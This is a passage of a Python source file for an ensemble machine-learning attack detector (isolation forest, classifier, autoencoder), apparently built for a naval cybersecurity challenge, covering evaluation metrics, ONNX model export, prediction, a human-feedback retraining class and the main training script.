            if 'binary' in model or model in ['isolation_forest', 'autoencoder']:
                pred_binary = pred if pred.max() <= 1 else (pred > 0).astype(int)
                results[f'{model}_f1'] = f1_score(y_test_binary, pred_binary)
                results[f'{model}_accuracy'] = accuracy_score(y_test_binary, pred_binary)
        
        # Classifier multi-class
        clf_f1_weighted = f1_score(y_test, predictions['classifier'], average='weighted')
        results['classifier_f1_weighted'] = clf_f1_weighted
        
        # Ensemble metrics
        results['ensemble_f1'] = f1_score(y_test_binary, ensemble_pred_binary)
        results['ensemble_accuracy'] = accuracy_score(y_test_binary, ensemble_pred_binary)
        
        try:
            results['ensemble_auc'] = roc_auc_score(y_test_binary, ensemble_scores)
        except:
            results['ensemble_auc'] = 0.0
        
        # Classification report
        logger.info("\nEnsemble Classification Report (Binary):")
        logger.info(classification_report(y_test_binary, ensemble_pred_binary, 
                                          target_names=['benign', 'attack']))
        
        logger.info(f"\nMulti-class Classification Report:")
        logger.info(classification_report(y_test, predictions['classifier'],
                                          target_names=self.categories))
        
        # Confusion matrix
        cm = confusion_matrix(y_test_binary, ensemble_pred_binary)
        logger.info(f"\nConfusion Matrix:\n{cm}")
        
        # False positive rate
        fp = cm[0, 1]
        tn = cm[0, 0]
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
        results['false_positive_rate'] = fpr
        
        logger.info(f"\nFalse Positive Rate: {fpr:.4%}")
        logger.info(f"Ensemble F1: {results['ensemble_f1']:.4f}")
        logger.info(f"Ensemble AUC: {results['ensemble_auc']:.4f}")
        
        return results
    
    def _save_models(self):
        """Save all models to disk (ONNX format where possible)"""
        logger.info("\nSaving models...")
        
        # Save scaler parameters (numpy format)
        np.savez(
            self.models_dir / 'scaler_params.npz',
            mean=self.scaler.mean_,
            scale=self.scaler.scale_
        )
        
        # Save metadata
        metadata = {
            'n_features': self.n_features,
            'categories': self.categories,
            'config': {
                'isolation_forest_contamination': self.config.isolation_forest_contamination,
                'ensemble_weights': self.config.ensemble_weights,
            },
            'created_at': datetime.now().isoformat(),
            'model_version': '2.0.0',
        }
        
        if hasattr(self, 'autoencoder_threshold'):
            metadata['autoencoder_threshold'] = float(self.autoencoder_threshold)
        
        with open(self.models_dir / 'ensemble_meta.json', 'w') as f:
            json.dump(metadata, f, indent=2)
        
        # Export to ONNX
        if ONNX_AVAILABLE:
            self._export_to_onnx()
        else:
            self._save_numpy_format()
        
        logger.info(f"Models saved to {self.models_dir}")
    
    def _export_to_onnx(self):
        """Export models to ONNX format"""
        
        # Isolation Forest
        try:
            initial_type = [('float_input', FloatTensorType([None, self.n_features]))]
            onnx_if = convert_sklearn(self.isolation_forest, initial_types=initial_type)
            onnx.save(onnx_if, str(self.models_dir / 'isolation_forest.onnx'))
            logger.info("  ✓ Isolation Forest exported to ONNX")
        except Exception as e:
            logger.warning(f"  ✗ Isolation Forest ONNX export failed: {e}")
            self._save_sklearn_as_numpy(self.isolation_forest, 'isolation_forest')
        
        # Classifier
        try:
            initial_type = [('float_input', FloatTensorType([None, self.n_features]))]
            onnx_clf = convert_sklearn(self.classifier, initial_types=initial_type)
            onnx.save(onnx_clf, str(self.models_dir / 'classifier.onnx'))
            logger.info("  ✓ Classifier exported to ONNX")
        except Exception as e:
            logger.warning(f"  ✗ Classifier ONNX export failed: {e}")
            self._save_sklearn_as_numpy(self.classifier, 'classifier')
        
        # Autoencoder
        if TORCH_AVAILABLE and self.autoencoder is not None:
            try:
                self.autoencoder.eval()
                dummy_input = torch.randn(1, self.n_features)
                torch.onnx.export(
                    self.autoencoder,
                    dummy_input,
                    str(self.models_dir / 'autoencoder.onnx'),
                    input_names=['input'],
                    output_names=['output'],
                    dynamic_axes={'input': {0: 'batch_size'}, 'output': {0: 'batch_size'}}
                )
                logger.info("  ✓ Autoencoder exported to ONNX")
            except Exception as e:
                logger.warning(f"  ✗ Autoencoder ONNX export failed: {e}")
                # Save PyTorch state dict
                torch.save(self.autoencoder.state_dict(), 
                          self.models_dir / 'autoencoder_state.pt')
    
    def _save_sklearn_as_numpy(self, model, name: str):
        """Save sklearn model parameters as numpy arrays"""
        params = {}
        
        if hasattr(model, 'estimators_'):
            # For ensemble models (RF, IF)
            for i, est in enumerate(model.estimators_[:10]):  # Save first 10
                if hasattr(est, 'tree_'):
                    params[f'tree_{i}_feature'] = est.tree_.feature
                    params[f'tree_{i}_threshold'] = est.tree_.threshold
                    params[f'tree_{i}_value'] = est.tree_.value
        
        if hasattr(model, 'offset_'):
            params['offset'] = model.offset_
        
        if params:
            np.savez(self.models_dir / f'{name}_params.npz', **params)
            logger.info(f"  ✓ {name} saved as numpy arrays")
    
    def _save_numpy_format(self):
        """Fallback: save models in numpy format"""
        
        # Isolation Forest
        self._save_sklearn_as_numpy(self.isolation_forest, 'isolation_forest')
        
        # Classifier
        self._save_sklearn_as_numpy(self.classifier, 'classifier')
        
        # Autoencoder
        if TORCH_AVAILABLE and self.autoencoder is not None:
            torch.save(self.autoencoder.state_dict(),
                      self.models_dir / 'autoencoder_state.pt')
            logger.info("  ✓ Autoencoder state dict saved")
    
    def predict(self, X: np.ndarray) -> Tuple[np.ndarray, np.ndarray, Dict]:
        """
        Make predictions using ensemble
        
        Returns:
            predictions: Binary predictions (0=benign, 1=attack)
            categories: Multi-class predictions
            details: Per-model scores and predictions
        """
        # Scale features
        X_scaled = self.scaler.transform(X)
        
        details = {}
        
        # Isolation Forest
        if_pred = self.isolation_forest.predict(X_scaled)
        if_scores = -self.isolation_forest.score_samples(X_scaled)
        details['isolation_forest'] = {
            'prediction': (if_pred == -1).astype(int),
            'score': if_scores
        }
        
        # Classifier
        clf_pred = self.classifier.predict(X_scaled)
        clf_proba = self.classifier.predict_proba(X_scaled)
        details['classifier'] = {
            'prediction': clf_pred,
            'score': 1 - clf_proba[:, 0],
            'probabilities': clf_proba
        }
        
        # Autoencoder
        if TORCH_AVAILABLE and self.autoencoder is not None:
            self.autoencoder.eval()
            with torch.no_grad():
                X_tensor = torch.FloatTensor(X_scaled)
                ae_errors = self.autoencoder.get_reconstruction_error(X_tensor).numpy()
            
            details['autoencoder'] = {
                'prediction': (ae_errors > self.autoencoder_threshold).astype(int),
                'score': ae_errors
            }
        
        # Ensemble
        weights = self.config.ensemble_weights
        ensemble_scores = np.zeros(len(X))
        
        for model, model_details in details.items():
            if model in weights:
                scores = model_details['score']
                normalized = (scores - scores.min()) / (scores.max() - scores.min() + 1e-8)
                ensemble_scores += weights[model] * normalized
        
        predictions = (ensemble_scores > 0.5).astype(int)
        categories = clf_pred
        
        details['ensemble'] = {
            'score': ensemble_scores,
            'prediction': predictions
        }
        
        return predictions, categories, details


# ============================================================================
# CONTINUOUS LEARNING
# ============================================================================

class ContinuousLearner:
    """
    Continuous learning framework for model updates
    
    Features:
    - Collects misclassified samples
    - Periodic retraining triggers
    - Human feedback integration
    - Model versioning
    """
    
    def __init__(self, 
                 trainer: EnsembleTrainer,
                 feedback_dir: str = "./data/feedback",
                 min_samples_for_retrain: int = 100):
        
        self.trainer = trainer
        self.feedback_dir = Path(feedback_dir)
        self.feedback_dir.mkdir(parents=True, exist_ok=True)
        
        self.min_samples_for_retrain = min_samples_for_retrain
        
        # Feedback storage
        self.false_positives: List[Dict] = []
        self.false_negatives: List[Dict] = []
        self.confirmed_attacks: List[Dict] = []
        
        # Load existing feedback
        self._load_feedback()
    
    def record_feedback(self, 
                        sample: np.ndarray,
                        predicted_label: int,
                        true_label: int,
                        feedback_type: str,
                        metadata: Dict = None):
        """
        Record human feedback on a prediction
        
        feedback_type: 'false_positive', 'false_negative', 'confirmed'
        """
        feedback_entry = {
            'features': sample.tolist(),
            'predicted': predicted_label,
            'true': true_label,
            'timestamp': datetime.now().isoformat(),
            'metadata': metadata or {}
        }
        
        if feedback_type == 'false_positive':
            self.false_positives.append(feedback_entry)
        elif feedback_type == 'false_negative':
            self.false_negatives.append(feedback_entry)
        elif feedback_type == 'confirmed':
            self.confirmed_attacks.append(feedback_entry)
        
        self._save_feedback()
        
        # Check if retraining needed
        total_feedback = len(self.false_positives) + len(self.false_negatives)
        if total_feedback >= self.min_samples_for_retrain:
            logger.info(f"Sufficient feedback collected ({total_feedback}). Consider retraining.")
    
    def should_retrain(self) -> Tuple[bool, str]:
        """Check if model should be retrained"""
        
        total_feedback = len(self.false_positives) + len(self.false_negatives)
        
        if total_feedback >= self.min_samples_for_retrain:
            return True, f"Collected {total_feedback} feedback samples"
        
        # Check false positive rate
        if len(self.false_positives) > 50:
            return True, f"High false positive rate ({len(self.false_positives)} FPs)"
        
        return False, "Insufficient feedback"
    
    def get_retraining_dataset(self) -> Tuple[np.ndarray, np.ndarray]:
        """Get dataset augmented with feedback samples"""
        
        X_feedback = []
        y_feedback = []
        
        # Add false positives (correct label = benign)
        for fp in self.false_positives:
            X_feedback.append(fp['features'])
            y_feedback.append(0)
        
        # Add false negatives (correct label = attack)
        for fn in self.false_negatives:
            X_feedback.append(fn['features'])
            y_feedback.append(fn['true'])
        
        # Add confirmed attacks
        for ca in self.confirmed_attacks:
            X_feedback.append(ca['features'])
            y_feedback.append(ca['true'])
        
        if X_feedback:
            return np.array(X_feedback), np.array(y_feedback)
        return None, None
    
    def _save_feedback(self):
        """Save feedback to disk"""
        feedback_data = {
            'false_positives': self.false_positives,
            'false_negatives': self.false_negatives,
            'confirmed_attacks': self.confirmed_attacks,
            'last_updated': datetime.now().isoformat()
        }
        
        with open(self.feedback_dir / 'feedback.json', 'w') as f:
            json.dump(feedback_data, f, indent=2)
    
    def _load_feedback(self):
        """Load existing feedback"""
        feedback_file = self.feedback_dir / 'feedback.json'
        
        if feedback_file.exists():
            with open(feedback_file) as f:
                data = json.load(f)
            
            self.false_positives = data.get('false_positives', [])
            self.false_negatives = data.get('false_negatives', [])
            self.confirmed_attacks = data.get('confirmed_attacks', [])


# ============================================================================
# MAIN TRAINING SCRIPT
# ============================================================================

def main():
    """Main training entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='DECEPTICON Ensemble ML Trainer')
    parser.add_argument('--samples', type=int, default=1000,
                        help='Samples per category (default: 1000)')
    parser.add_argument('--no-augment', action='store_true',
                        help='Disable data augmentation')
    parser.add_argument('--models-dir', type=str, default='./models',
                        help='Output directory for models')
    parser.add_argument('--no-early-stopping', action='store_true',
                        help='Disable early stopping')
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║     DECEPTICON ML Training Pipeline                          ║
    ║     Naval SWAVLAMBAN 2025 - Challenge 3                      ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Configuration
    config = TrainingConfig(models_dir=args.models_dir)
    
    # Generate dataset
    print("\n[1/4] Generating training dataset...")
    generator = AttackDatasetGenerator()
    X, y, categories = generator.generate_dataset(
        samples_per_category=args.samples,
        augment=not args.no_augment
    )
    
    print(f"    Dataset size: {X.shape[0]} samples, {X.shape[1]} features")
    print(f"    Categories: {categories}")
    print(f"    Class distribution: {Counter(y)}")
    
    # Train ensemble
    print("\n[2/4] Training ensemble models...")
    trainer = EnsembleTrainer(config)
    results = trainer.train(
        X, y, categories,
        use_early_stopping=not args.no_early_stopping
    )
    
    # Print results
    print("\n[3/4] Training Results:")
    print("=" * 60)
    
    for model, metrics in results.items():
        print(f"\n{model.upper()}:")
        if isinstance(metrics, dict):
            for k, v in metrics.items():
                if isinstance(v, float):
                    print(f"    {k}: {v:.4f}")
                else:
                    print(f"    {k}: {v}")
    
    # Save training report
    print("\n[4/4] Saving training report...")
    report_path = Path(args.models_dir) / 'training_report.json'
    
    # Convert numpy types to Python types for JSON
    def convert_to_serializable(obj):
        if isinstance(obj, np.floating):
            return float(obj)
        elif isinstance(obj, np.integer):
            return int(obj)
        elif isinstance(obj, np.ndarray):
            return obj.tolist()
        elif isinstance(obj, dict):
            return {k: convert_to_serializable(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [convert_to_serializable(v) for v in obj]
        return obj
    
    report = {
        'timestamp': datetime.now().isoformat(),
        'config': {
            'samples_per_category': args.samples,
            'augmentation': not args.no_augment,
            'early_stopping': not args.no_early_stopping,
        },
        'dataset': {
            'total_samples': int(X.shape[0]),
            'n_features': int(X.shape[1]),
            'categories': categories,
            'class_distribution': {str(k): int(v) for k, v in Counter(y).items()},
        },
        'results': convert_to_serializable(results),
    }
    
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"    Report saved to: {report_path}")
    
    print("\n" + "=" * 60)
    print("✓ Training complete!")
    print(f"  Models saved to: {args.models_dir}")
    print(f"  Ensemble F1: {results['ensemble']['ensemble_f1']:.4f}")
    print(f"  False Positive Rate: {results['ensemble']['false_positive_rate']:.4%}")
    print("=" * 60)


if __name__ == '__main__':
    main()
